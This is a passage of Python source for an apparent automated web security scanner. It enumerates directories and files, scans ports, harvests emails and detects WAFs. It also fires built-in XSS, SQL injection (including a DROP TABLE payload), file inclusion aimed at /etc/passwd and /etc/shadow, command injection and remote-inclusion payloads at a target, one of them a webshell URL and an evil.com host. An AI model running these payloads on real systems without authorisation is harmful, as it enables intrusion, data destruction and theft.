            'admin', 'login', 'uploads', 'images', 'js', 'css', 'api', 'dashboard', 'config', 'backup', 'test', 'dev', 'staging', 'private', 'public', 'data', 'files', 'docs', 'includes', 'lib', 'tmp', 'temp', 'old', 'archive', 'bin', 'cgi-bin', 'scripts', 'assets', 'static', 'media', 'content', 'download', 'downloads', 'user', 'users', 'account', 'accounts', 'register', 'signup', 'signin', 'logout', 'auth', 'secure', 'wp-admin', 'wp-content', 'wp-includes', 'blog', 'forum', 'shop', 'store', 'cart', 'checkout', 'payment', 'billing', 'order', 'orders', 'products', 'catalog', 'mail', 'email', 'webmail', 'contact', 'support', 'help', 'faq', 'news', 'changelog', 'readme', 'license', 'about', 'info', 'status', 'health', 'monitor', 'stats', 'analytics', 'metrics', 'robots.txt', 'sitemap.xml', '.git', '.svn', '.hg', '.bzr', '.well-known'
        ]
        self.common_files = [
            'index', 'default', 'home', 'main', 'admin', 'login', 'config', 'settings', 'database', 'db', 'backup', 'test', 'dev', 'readme', 'license', 'changelog', 'robots', 'sitemap', 'phpinfo', 'info', 'error', 'errors', 'debug', 'status', 'health', 'monitor', 'stats', 'analytics', 'metrics', 'api', 'swagger', 'openapi', 'manifest', 'service-worker', 'sw', 'worker', 'offline', 'app', 'application', 'script', 'scripts', 'run', 'start', 'boot', 'favicon', 'logo', 'icon', 'banner', 'header', 'footer'
        ]
        self.common_extensions = [
            '', '.php', '.asp', '.aspx', '.jsp', '.html', '.htm', '.js', '.css', '.json', '.xml', '.txt', '.md', '.bak', '.old', '.zip', '.tar', '.gz', '.rar', '.7z', '.sql', '.db', '.sqlite', '.log', '.out', '.err', '.conf', '.config', '.ini', '.env', '.yml', '.yaml', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico', '.mp4', '.mp3', '.wav', '.flac', '.csv', '.tsv', '.bak', '.tmp', '.swp', '.swo', '.DS_Store', '.htaccess', '.htpasswd'
        ]
    def enumerate_directories(self, base_url: str, concurrency: int = 20) -> Dict[str, Dict[str, Any]]:
        found_dirs = {}
        def check_directory(directory_name):
            try:
                normalized_base_url = base_url if base_url.endswith('/') else base_url + '/'
                test_url = urljoin(normalized_base_url, directory_name + '/')
                response = self.http_client.get(test_url, allow_redirects=False, timeout=10)
                if response.status_code in [200, 301, 302, 401, 403]:
                    result = {
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'content_type': response.headers.get('content-type', ''),
                        'server': response.headers.get('server', ''),
                        'location': response.headers.get('location', '') if response.status_code in [301, 302] else '',
                        'directory_listing': 'index of' in response.text.lower() or 'directory listing' in response.text.lower()
                    }
                    return directory_name, result
            except Exception:
                pass
            return None, None
        with ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = [executor.submit(check_directory, dir_name) for dir_name in self.common_dirs]
            for future in as_completed(futures):
                dir_name, result = future.result()
                if dir_name and result:
                    found_dirs[dir_name] = result
        return found_dirs
    def enumerate_files(self, base_url: str, concurrency: int = 20) -> Dict[str, Dict[str, Any]]:
        found_files = {}
        def check_file(filename, extension):
            try:
                normalized_base_url = base_url if base_url.endswith('/') else base_url + '/'
                test_url = urljoin(normalized_base_url, filename + extension)
                response = self.http_client.get(test_url, allow_redirects=False, timeout=10)
                if response.status_code in [200, 301, 302]:
                    result = {
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'content_type': response.headers.get('content-type', ''),
                        'server': response.headers.get('server', ''),
                        'last_modified': response.headers.get('last-modified', ''),
                        'etag': response.headers.get('etag', ''),
                        'has_sensitive_content': self._check_sensitive_content(response.text, extension)
                    }
                    return filename + extension, result
            except Exception:
                pass
            return None, None
        with ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = []
            for filename in self.common_files:
                for extension in self.common_extensions:
                    futures.append(executor.submit(check_file, filename, extension))
            for future in as_completed(futures):
                file_name, result = future.result()
                if file_name and result:
                    found_files[file_name] = result
        return found_files
    def _check_sensitive_content(self, content: str, extension: str) -> bool:
        if not content:
            return False
        content_lower = content.lower()
        sensitive_patterns = [
            'password', 'passwd', 'pwd', 'secret', 'key', 'token', 'api_key',
            'database', 'mysql', 'postgres', 'mongodb', 'redis',
            'config', 'configuration', 'settings',
            'debug', 'error', 'exception', 'traceback',
            'version', 'php_version', 'server_info',
            'directory', 'path', 'file_get_contents'
        ]
        return any(pattern in content_lower for pattern in sensitive_patterns)

class VulnerabilityScanner:
    """Advanced vulnerability scanner with comprehensive payloads."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
        # XSS payloads
        self.xss_payloads = [
            '<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>', '\"><script>alert("XSS")</script>', '\';alert("XSS");//', 'javascript:alert("XSS")', '<svg onload=alert("XSS")>', '<iframe src="javascript:alert(`XSS`)"></iframe>', '<body onload=alert("XSS")>', '<input onfocus=alert("XSS") autofocus>', '<select onfocus=alert("XSS") autofocus>', '<textarea onfocus=alert("XSS") autofocus>', '<keygen onfocus=alert("XSS") autofocus>', '<video><source onerror="alert(`XSS`)">', '<audio src=x onerror=alert("XSS")>', '<details open ontoggle=alert("XSS")>', '<marquee onstart=alert("XSS")>XSS</marquee>'
        ]
        # SQLi payloads
        self.sqli_payloads = [
            "'", '"', "1' OR '1'='1", '1" OR "1"="1', "' OR 1=1--", '" OR 1=1--', "' OR 1=1#", '" OR 1=1#', "1' AND 1=1--", '1" AND 1=1--', "' UNION SELECT NULL--", '" UNION SELECT NULL--', "1' UNION SELECT 1,2,3--", '1" UNION SELECT 1,2,3--', "'; DROP TABLE users--", '"; DROP TABLE users--', "1' ORDER BY 1--", '1" ORDER BY 1--', "1' GROUP BY 1--", '1" GROUP BY 1--', "1' HAVING 1=1--", '1" HAVING 1=1--'
        ]
        # LFI payloads
        self.lfi_payloads = [
            '../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', '/etc/passwd', 'C:\\windows\\system32\\drivers\\etc\\hosts', '....//....//....//etc/passwd', '....\\....\\....\\windows\\system32\\drivers\\etc\\hosts', '/proc/self/environ', '/proc/version', '/proc/cmdline', 'C:\\boot.ini', 'C:\\windows\\win.ini', '/var/log/apache/access.log', '/var/log/apache2/access.log', '/etc/httpd/logs/access_log', '/etc/mysql/my.cnf', '/etc/passwd%00', '/etc/shadow', '/root/.bash_history', '/home/user/.bash_history'
        ]
        # RFI payloads
        self.rfi_payloads = [
            'http://evil.com/shell.txt', 'https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell.php', 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=='
        ]
        # Command injection payloads
        self.cmd_payloads = [
            '; ls', '| ls', '& dir', '&& ls', '|| ls', '; cat /etc/passwd', '| cat /etc/passwd', '; id', '| id', '; uname -a', '| uname -a', '; whoami', '| whoami', '`ls`', '$(ls)', '${ls}', '; sleep 5', '| sleep 5', '; ping -c 4 127.0.0.1', '| ping -c 4 127.0.0.1'
        ]
    def scan_url(self, url: str, parameters: List[str] = None) -> List[Dict[str, Any]]:
        vulnerabilities = []
        if not parameters:
            parsed = urlparse(url)
            parameters = list(parse_qs(parsed.query).keys())
        if not parameters:
            logger.info(f"No parameters found to test in {url}")
            return vulnerabilities
        logger.info(f"Starting vulnerability scan for {url} with parameters: {parameters}")
        try:
            baseline = self.http_client.get(url)
            baseline_content = baseline.text
            baseline_status = baseline.status_code
            baseline_time = time.time()
        except Exception as e:
            logger.error(f"Failed to get baseline response for {url}: {e}")
            return vulnerabilities
        for param in parameters:
            vulnerabilities.extend(self._test_xss(url, param, baseline_content, baseline_status))
            vulnerabilities.extend(self._test_sqli(url, param, baseline_content, baseline_status, baseline_time))
            vulnerabilities.extend(self._test_lfi(url, param, baseline_content, baseline_status))
            vulnerabilities.extend(self._test_rfi(url, param, baseline_content, baseline_status))
            vulnerabilities.extend(self._test_command_injection(url, param, baseline_content, baseline_status))
        return vulnerabilities
    def _test_xss(self, url: str, param: str, baseline_content: str, baseline_status: int) -> List[Dict[str, Any]]:
        vulnerabilities = []
        for payload in self.xss_payloads:
            try:
                test_url = self._inject_payload(url, param, payload)
                response = self.http_client.get(test_url)
                if (payload in response.text or payload.replace('"', '&quot;') in response.text or payload.replace('<', '&lt;').replace('>', '&gt;') in response.text):
                    vuln = {
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'High',
                        'parameter': param,
                        'payload': payload,
                        'url': test_url,
                        'evidence': 'Payload reflected in response',
                        'status_code': response.status_code,
                        'response_length': len(response.content),
                        'reflected_payload': payload in response.text,
                        'request': {
                            'method': 'GET',
                            'url': test_url,
                            'headers': dict(response.request.headers) if hasattr(response, 'request') and hasattr(response.request, 'headers') else {},
                            'body': None
                        },
                        'response_snippet': response.text[:200]
                    }
                    vulnerabilities.append(vuln)
                    logger.warning(f"XSS vulnerability found in parameter '{param}' at {url}")
                    break
            except Exception as e:
                logger.debug(f"Error testing XSS for {param}: {e}")
        return vulnerabilities
    def _test_sqli(self, url: str, param: str, baseline_content: str, baseline_status: int, baseline_time: float) -> List[Dict[str, Any]]:
        vulnerabilities = []
        sql_errors = [
            'mysql_fetch_array', 'mysql_fetch_assoc', 'mysql_num_rows', 'mysql_error', 'warning: mysql', 'function.mysql', 'mysql result', 'mysqld', 'postgresql query failed', 'pg_query', 'pg_exec', 'postgres', 'microsoft ole db provider for odbc drivers', 'microsoft ole db provider for sql server', 'sqlserver', 'mssql', 'microsoft jet database', 'ora-00933', 'ora-00921', 'ora-00936', 'ora-01756', 'ora-00942', 'oracle error', 'oracle driver', 'sql syntax', 'syntax error', 'invalid query', 'quoted string not properly terminated', 'unclosed quotation mark', 'incorrect syntax near', 'unexpected end of sql command', 'warning: pg_query', 'valid mysql result', 'sqlite_exception', 'sqlite error', 'sqlstate', 'syntax error or access violation'
        ]
        for payload in self.sqli_payloads:
            try:
                test_url = self._inject_payload(url, param, payload)
                start_time = time.time()
                response = self.http_client.get(test_url)
                response_time = time.time() - start_time
                response_lower = response.text.lower()
                for error in sql_errors:
                    if error in response_lower:
                        vuln = {
                            'type': 'SQL Injection (Error-based)',
                            'severity': 'Critical',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'evidence': f'SQL error detected: {error}',
                            'status_code': response.status_code,
                            'response_length': len(response.content),
                            'error_message': error,
                            'request': {
                                'method': 'GET',
                                'url': test_url,
                                'headers': dict(response.request.headers) if hasattr(response, 'request') and hasattr(response.request, 'headers') else {},
                                'body': None
                            },
                            'response_snippet': response.text[:200]
                        }
                        vulnerabilities.append(vuln)
                        logger.warning(f"SQL Injection vulnerability found in parameter '{param}' at {url}")
                        return vulnerabilities
                if 'sleep' in payload.lower() and response_time > 4:
                    vuln = {
                        'type': 'SQL Injection (Time-based)',
                        'severity': 'Critical',
                        'parameter': param,
                        'payload': payload,
                        'url': test_url,
                        'evidence': f'Response delayed by {response_time:.2f} seconds',
                        'status_code': response.status_code,
                        'response_time': response_time,
                        'request': {
                            'method': 'GET',
                            'url': test_url,
                            'headers': dict(response.request.headers) if hasattr(response, 'request') and hasattr(response.request, 'headers') else {},
                            'body': None
                        },
                        'response_snippet': response.text[:200]
                    }
                    vulnerabilities.append(vuln)
                    logger.warning(f"Time-based SQL Injection found in parameter '{param}' at {url}")
                    return vulnerabilities
                elif (response.status_code != baseline_status or abs(len(response.text) - len(baseline_content)) > 100):
                    vuln = {
                        'type': 'SQL Injection (Blind)',
                        'severity': 'High',
                        'parameter': param,
                        'payload': payload,
                        'url': test_url,
                        'evidence': 'Response behavior differs significantly from baseline',
                        'status_code': response.status_code,
                        'baseline_status': baseline_status,
                        'response_length': len(response.content),
                        'baseline_length': len(baseline_content),
                        'request': {
                            'method': 'GET',
                            'url': test_url,
                            'headers': dict(response.request.headers) if hasattr(response, 'request') and hasattr(response.request, 'headers') else {},
                            'body': None
                        },
                        'response_snippet': response.text[:200]
                    }
                    vulnerabilities.append(vuln)
                    logger.warning(f"Potential blind SQL Injection found in parameter '{param}' at {url}")
            except Exception as e:
                logger.debug(f"Error testing SQL injection for {param}: {e}")
        return vulnerabilities
    def _test_lfi(self, url: str, param: str, baseline_content: str, baseline_status: int) -> List[Dict[str, Any]]:
        vulnerabilities = []
        lfi_indicators = [
            'root:x:', 'daemon:x:', 'bin:x:', 'sys:x:', 'sync:x:', 'games:x:', 'man:x:', 'lp:x:', 'mail:x:', 'news:x:', 'uucp:x:', 'proxy:x:', 'www-data:x:', 'backup:x:', 'list:x:', 'irc:x:', 'gnats:x:', 'nobody:x:', 'libuuid:x:', 'mysql:x:', 'apache:x:', 'nginx:x:', '[fonts]', '[extensions]', '[mci extensions]', '[files]', '[mail]', '# localhost name resolution', '# copyright', '# hosts file', '127.0.0.1\tlocalhost', '::1\tlocalhost', 'microsoft windows', 'ms-dos', 'config.sys', 'autoexec.bat', 'program files', 'windows\\system32', 'windows\\system', 'winnt\\system32', 'winnt\\profiles'
        ]
        for payload in self.lfi_payloads:
            try:
                test_url = self._inject_payload(url, param, payload)
                response = self.http_client.get(test_url)
                response_lower = response.text.lower()
                for indicator in lfi_indicators:
                    if indicator in response_lower:
                        vuln = {
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'High',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'evidence': f'File contents detected: {indicator}',
                            'status_code': response.status_code,
                            'response_length': len(response.content),
                            'file_indicator': indicator
                        }
                        vulnerabilities.append(vuln)
                        logger.warning(f"LFI vulnerability found in parameter '{param}' at {url}")
                        return vulnerabilities
            except Exception as e:
                logger.debug(f"Error testing LFI for {param}: {e}")
        return vulnerabilities
    def _test_rfi(self, url: str, param: str, baseline_content: str, baseline_status: int) -> List[Dict[str, Any]]:
        vulnerabilities = []
        for payload in self.rfi_payloads:
            try:
                test_url = self._inject_payload(url, param, payload)
                response = self.http_client.get(test_url)
                rfi_indicators = [
                    'allow_url_include', 'allow_url_fopen', 'include_path', 'failed to open stream', 'no such file or directory', 'http:// wrapper is disabled', 'https:// wrapper is disabled'
                ]
                response_lower = response.text.lower()
                for indicator in rfi_indicators:
                    if indicator in response_lower:
                        vuln = {
                            'type': 'Remote File Inclusion (RFI)',
                            'severity': 'Critical',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'evidence': f'RFI indicator detected: {indicator}',
                            'status_code': response.status_code,
                            'response_length': len(response.content),
                            'rfi_indicator': indicator
                        }
                        vulnerabilities.append(vuln)
                        logger.warning(f"RFI vulnerability found in parameter '{param}' at {url}")
                        return vulnerabilities
            except Exception as e:
                logger.debug(f"Error testing RFI for {param}: {e}")
        return vulnerabilities
    def _test_command_injection(self, url: str, param: str, baseline_content: str, baseline_status: int) -> List[Dict[str, Any]]:
        vulnerabilities = []
        cmd_indicators = [
            'uid=', 'gid=', 'groups=', 'total ', 'drwxr-xr-x', 'drwxrwxrwx', 'volume serial number', 'directory of', 'file not found', 'sh: ', 'bash: ', 'cmd: ', 'command not found', 'no such file', 'permission denied', 'access denied', 'cannot access', 'system cannot find', 'bad command or file name', 'ping statistics', 'packets transmitted', 'packets received', 'bin/sh', 'bin/bash', 'cmd.exe', 'system32', 'proc/', 'linux', 'windows nt', 'microsoft windows', 'darwin'
        ]
        for payload in self.cmd_payloads:
            try:
                test_url = self._inject_payload(url, param, payload)
                response = self.http_client.get(test_url)
                response_lower = response.text.lower()
                for indicator in cmd_indicators:
                    if indicator in response_lower:
                        vuln = {
                            'type': 'Command Injection',
                            'severity': 'Critical',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'evidence': f'Command output detected: {indicator}',
                            'status_code': response.status_code,
                            'response_length': len(response.content),
                            'command_indicator': indicator
                        }
                        vulnerabilities.append(vuln)
                        logger.warning(f"Command Injection vulnerability found in parameter '{param}' at {url}")
                        return vulnerabilities
            except Exception as e:
                logger.debug(f"Error testing command injection for {param}: {e}")
        return vulnerabilities
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

class SSLAnalyzer:
    """Analyzes SSL/TLS certificates and checks for common SSL vulnerabilities."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client

    def analyze_ssl_certificate(self, hostname: str, port: int = 443) -> Dict[str, Any]:
        import ssl, socket
        result = {
            'certificate_valid': False,
            'ssl_version': None,
            'cipher_suite': None,
            'certificate_details': {},
            'vulnerabilities': [],
            'security_score': 0
        }
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=8) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    result['certificate_valid'] = True
                    result['ssl_version'] = ssock.version()
                    result['cipher_suite'] = ssock.cipher()[0]
                    result['certificate_details'] = cert
                    # Expiry check
                    not_after = cert.get('notAfter')
                    if not_after:
                        from datetime import datetime
                        exp = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        if exp < datetime.utcnow():
                            result['vulnerabilities'].append({'type': 'Expired SSL Certificate', 'severity': 'High', 'evidence': not_after})
                    # Weak cipher check
                    weak_ciphers = ['RC4', 'MD5', 'DES', '3DES', 'NULL', 'EXP', 'aNULL']
                    if any(w in result['cipher_suite'] for w in weak_ciphers):
                        result['vulnerabilities'].append({'type': 'Weak Cipher Suite', 'severity': 'High', 'evidence': result['cipher_suite']})
                    # Score
                    score = 100
                    if result['vulnerabilities']:
                        score -= 30 * len(result['vulnerabilities'])
                    result['security_score'] = max(0, score)
        except Exception as e:
            logger.warning(f"SSL analysis failed for {hostname}: {e}")
        return result

class RobotsAnalyzer:
    """Fetches and parses robots.txt for disallowed paths and sitemaps."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client

    def analyze_robots_txt(self, base_url: str) -> Dict[str, Any]:
        result = {'exists': False, 'disallowed_paths': [], 'sitemaps': [], 'interesting_findings': []}
        robots_url = urljoin(base_url, '/robots.txt')
        try:
            resp = self.http_client.get(robots_url, timeout=8)
            if resp.status_code == 200:
                result['exists'] = True
                lines = resp.text.splitlines()
                for line in lines:
                    if line.lower().startswith('disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path:
                            result['disallowed_paths'].append(path)
                            if any(x in path for x in ['admin', 'login', 'backup', 'private', 'config', 'test', 'dev']):
                                result['interesting_findings'].append({'path': path, 'reason': 'Sensitive path'})
                    elif line.lower().startswith('sitemap:'):
                        sitemap = line.split(':', 1)[1].strip()
                        result['sitemaps'].append(sitemap)
        except Exception as e:
            logger.warning(f"Failed to fetch robots.txt: {e}")
        return result

class PortScanner:
    """Scans common ports on the target host."""
    def __init__(self):
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 8888]

    def scan_ports(self, hostname: str, timeout: float = 2.0) -> Dict[str, Any]:
        open_ports = []
        total_scanned = 0
        for port in self.common_ports:
            total_scanned += 1
            try:
                with socket.create_connection((hostname, port), timeout=timeout) as sock:
                    banner = ''
                    try:
                        sock.settimeout(1)
                        banner = sock.recv(1024).decode(errors='ignore').strip()
                    except Exception:
                        pass
                    open_ports.append({'port': port, 'service': self._port_service(port), 'status': 'open', 'banner': banner})
            except Exception:
                pass
        return {'open_ports': open_ports, 'total_scanned': total_scanned}

    def _port_service(self, port: int) -> str:
        services = {21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 465: 'SMTPS', 587: 'SMTP', 993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 8888: 'HTTP-Alt'}
        return services.get(port, 'Unknown')

class EmailHarvester:
    """Crawls URLs and extracts email addresses."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
        self.email_regex = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+')

    def harvest_emails(self, urls: List[str]) -> Dict[str, Any]:
        emails = set()
        for url in urls:
            try:
                resp = self.http_client.get(url, timeout=8)
                found = self.email_regex.findall(resp.text)
                emails.update(found)
            except Exception:
                pass
        return {'total_emails': len(emails), 'emails': sorted(list(emails))}

class WAFDetector:
    """Detects Web Application Firewalls using response fingerprinting."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
        self.known_wafs = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'Akamai': ['akamai'],
            'AWS WAF': ['x-amzn-requestid'],
            'Imperva Incapsula': ['incap_ses', 'incapsula'],
            'F5 BIG-IP': ['bigipserver'],
            'Sucuri': ['x-sucuri'],
            'Barracuda': ['barracuda'],
            'DenyAll': ['denyall'],
            'Citrix': ['citrix'],
            'DDoS-Guard': ['ddos-guard'],
            'StackPath': ['stackpath-id']
        }

    def detect_waf(self, url: str) -> Dict[str, Any]:
        result = {'detected': False, 'waf_name': None, 'confidence': 'low', 'detection_method': []}
        try:
            resp = self.http_client.get(url, timeout=8)
            headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
            for waf, patterns in self.known_wafs.items():
                for pattern in patterns:
                    if any(pattern in k or pattern in v for k, v in headers.items()):
                        result['detected'] = True
                        result['waf_name'] = waf
                        result['confidence'] = 'medium'
                        result['detection_method'].append(f'Header: {pattern}')
            # Simple payload test
            if not result['detected']:
                test_url = url + ("?waf_test=<script>alert(1)</script>" if '?' not in url else "&waf_test=<script>alert(1)</script>")
                test_resp = self.http_client.get(test_url, timeout=8)
                if test_resp.status_code in [406, 501, 999] or 'waf' in test_resp.text.lower():
                    result['detected'] = True
                    result['waf_name'] = 'Unknown/Generic WAF'
                    result['confidence'] = 'low'
                    result['detection_method'].append('Payload response')
        except Exception:
            pass
        return result

class BackupFileFinder:
    """Looks for backup file variants of discovered files."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
        self.backup_exts = ['.bak', '.old', '.zip', '.tar.gz', '.tar', '.rar', '.7z', '.backup', '.copy', '.tmp', '.swp', '.swo', '.1', '.2', '.orig']

    def find_backup_files(self, base_url: str, file_paths: List[str]) -> List[Dict[str, Any]]:
        found = []
        for file_path in file_paths:
            for ext in self.backup_exts:
                if file_path.endswith(ext):
                    continue
                backup_url = urljoin(base_url, file_path + ext)
                try:
                    resp = self.http_client.get(backup_url, timeout=8)
                    if resp.status_code == 200 and len(resp.content) > 0:
                        found.append({'original_file': file_path, 'backup_file': file_path + ext, 'size': len(resp.content)})
                except Exception:
                    pass
        return found

class NewtonScanner:
    def __init__(self, target: str, rate_limit: float = 15, proxies: list = None, timeout: int = 15, config: dict = None):
        self.target = url_validate_and_normalize(target)
        self.rate_limiter = RateLimiter(rate_limit)
        self.http_client = HttpClient(rate_limiter=self.rate_limiter, proxies=proxies, timeout=timeout)
        self.silent = False
        self.verbose = False
        if config:
            self.silent = config.get('silent', False)
            self.verbose = config.get('verbose', False)
            # Override other params if present in config
            if 'rate_limit' in config:
                self.rate_limiter = RateLimiter(config['rate_limit'])
            if 'proxies' in config:
                self.http_client = HttpClient(rate_limiter=self.rate_limiter, proxies=config['proxies'], timeout=config.get('timeout', timeout))
            if 'timeout' in config:
                self.http_client.timeout = config['timeout']
        # ... existing component initializations ...
        self.subdomain_enum = SubdomainEnumerator(self.http_client)
        self.tech_detector = TechnologyDetector(self.http_client)
        self.dir_file_enum = DirectoryFileEnumerator(self.http_client)
        self.vuln_scanner = VulnerabilityScanner(self.http_client)
        self.security_analyzer = SecurityAnalyzer(self.http_client)
        self.ssl_analyzer = SSLAnalyzer(self.http_client)
        self.robots_analyzer = RobotsAnalyzer(self.http_client)
        self.port_scanner = PortScanner()
        self.email_harvester = EmailHarvester(self.http_client)
        self.waf_detector = WAFDetector(self.http_client)
        self.backup_finder = BackupFileFinder(self.http_client)
        self.results = {
            "scan_info": {
                "timestamp": datetime.now().isoformat(),
                "target": target,
                "scanner_version": "2.0",
                "scan_duration": 0
            },
            "reconnaissance": {},
            "vulnerabilities": [],
            "security_analysis": {}
        }
        self.log_file = None
        if config:
            self.log_file = config.get('log_file', 'fuzzer.log')
        else:
            self.log_file = 'fuzzer.log'

    def run(self, config: dict = None) -> dict:
        """
        Orchestrator-friendly entry point: runs the scan and returns the results as a dict.
        Accepts a config dict for options (threads, scan phases, etc.).
        Handles errors and supports silent/verbose operation.
        """
        # Prepare args-like object for compatibility
        class Args:
            pass
        args = Args()
        args.threads = config.get('threads', 25) if config else 25
        args.rate_limit = config.get('rate_limit', 15) if config else 15
        args.proxies = config.get('proxies', None) if config else None
        args.timeout = config.get('timeout', 15) if config else 15
        args.subdomains_only = config.get('subdomains_only', False) if config else False
        args.dirs_files_only = config.get('dirs_files_only', False) if config else False
        args.web_analyze_only = config.get('web_analyze_only', False) if config else False
        args.fuzz_only = config.get('fuzz_only', False) if config else False
        args.skip_network = config.get('skip_network', False) if config else False
        args.output = config.get('output', None) if config else None

        try:
            if not self.silent:
                print(f"[Fuzzing] Starting comprehensive scan for {self.target}")
            results = self.run_comprehensive_scan(args)
            findings = results.get('vulnerabilities', [])
            errors = []
            # Log each finding
            with open(self.log_file, 'a', encoding='utf-8') as logf:
                for finding in findings:
                    logf.write(json.dumps({'module': 'fuzzing', 'finding': finding}) + '\n')
            if not self.silent:
                print(f"[Fuzzing] Scan complete. {len(findings)} vulnerabilities found.")
            return {'findings': findings, 'errors': errors, 'full_results': results}
        except Exception as e:
            error_report = {
                'findings': [],
                'errors': [str(e)],
                'full_results': {}
            }
            if not self.silent:
                print(f"[Fuzzing] Scan failed: {e}")
            return error_report

    def run_comprehensive_scan(self, args: argparse.Namespace) -> Dict[str, Any]:
        """Run comprehensive security scan."""
        scan_start_time = time.time()
        logger.info(f"Starting comprehensive security scan for {self.target}")
        
        # Parse target URL
        if not self.target.startswith(('http://', 'https://')):
            base_url = f"https://{self.target}"
            domain = self.target.split(':')[0]
        else:
            base_url = self.target
            domain = urlparse(self.target).netloc.split(':')[0]
        
        # Validate target
        if not urlparse(base_url).netloc:
            logger.error(f"Invalid target URL: {self.target}")
            return self.results

        try:
            # Detect CDN/static hosting
            cdn_hosts = ['github.io', 'netlify.app', 'vercel.app', 'pages.dev']
            is_cdn = any(domain.endswith(cdn) for cdn in cdn_hosts)
            
            # Phase 1: Subdomain Enumeration
            if not any([args.dirs_files_only, args.fuzz_only, args.web_analyze_only]):
                logger.info("\n[PHASE 1] Subdomain Enumeration")
                subdomains = self.subdomain_enum.enumerate_all(domain, concurrency=args.threads)
                self.results['reconnaissance']['subdomains'] = {
                    'count': len(subdomains),
                    'list': subdomains
                }
                logger.info(f"Discovered {len(subdomains)} subdomains")
                
                if args.subdomains_only:
                    return self.results

            # Phase 2: Technology Stack Detection
            logger.info("\n[PHASE 2] Technology Stack Detection")
            tech_info = self.tech_detector.detect_technology(base_url)
            self.results['reconnaissance']['technology_stack'] = tech_info
            
            if tech_info.get('response_analysis', {}).get('status_code'):
                status_code = tech_info['response_analysis']['status_code']
                response_time = tech_info['response_analysis']['response_time_ms']
                logger.info(f"Target accessible (Status: {status_code}, Response Time: {response_time}ms)")
                
                # Log technology findings
                server_info = tech_info.get('server_info', {})
                if server_info.get('web_server') != 'Unknown':
                    logger.info(f"Web Server: {server_info['web_server']} {server_info.get('version', '')}")
                
                if tech_info.get('programming_languages'):
                    logger.info(f"Programming Languages: {', '.join(tech_info['programming_languages'])}")
                
                if tech_info.get('web_frameworks'):
                    logger.info(f"Web Frameworks: {', '.join(tech_info['web_frameworks'])}")
                
                cms_info = tech_info.get('cms_info', {})
                if cms_info.get('cms_name'):
                    logger.info(f"CMS: {cms_info['cms_name']} {cms_info.get('version', '')}")
                
                if tech_info.get('javascript_libraries'):
                    logger.info(f"JavaScript Libraries: {', '.join(tech_info['javascript_libraries'])}")
                
                if tech_info.get('database_tech'):
                    logger.info(f"Database Technologies: {', '.join(tech_info['database_tech'])}")
                
                if tech_info.get('cdn_services'):
                    logger.info(f"CDN Services: {', '.join(tech_info['cdn_services'])}")
                    
            else:
                logger.warning("Target is not accessible or returned no response")
            
            if args.web_analyze_only:
                return self.results

            # Phase 3: WAF Detection
            logger.info("\n[PHASE 3] WAF Detection")
            waf_results = self.waf_detector.detect_waf(base_url)
            self.results['reconnaissance']['waf_detection'] = waf_results
            
            if waf_results.get('detected'):
                logger.warning(f"WAF detected: {waf_results.get('waf_name', 'Unknown')} (Confidence: {waf_results.get('confidence', 'low')})")
            else:
                logger.info("No WAF detected")

            # Phase 4: Robots.txt Analysis
            logger.info("\n[PHASE 4] Robots.txt Analysis")
            robots_results = self.robots_analyzer.analyze_robots_txt(base_url)
            self.results['reconnaissance']['robots_analysis'] = robots_results
            
            if robots_results.get('exists'):
                logger.info(f"Robots.txt found - {len(robots_results.get('disallowed_paths', []))} disallowed paths")
                
                interesting_findings = robots_results.get('interesting_findings', [])
                if interesting_findings:
                    logger.warning(f"Found {len(interesting_findings)} interesting paths in robots.txt")

            # Phase 5: Security Headers Analysis
            logger.info("\n[PHASE 5] Security Headers Analysis")
            security_analysis = self.security_analyzer.analyze_security_headers(base_url)
            self.results['security_analysis'] = security_analysis
            
            if security_analysis:
                score = security_analysis.get('security_score', 0)
                max_score = security_analysis.get('max_score', 100)
                logger.info(f"Security Score: {score}/{max_score} ({score/max_score*100:.1f}%)")
                
                missing_headers = security_analysis.get('missing_headers', [])
                if missing_headers:
                    logger.warning(f"Missing {len(missing_headers)} critical security headers")

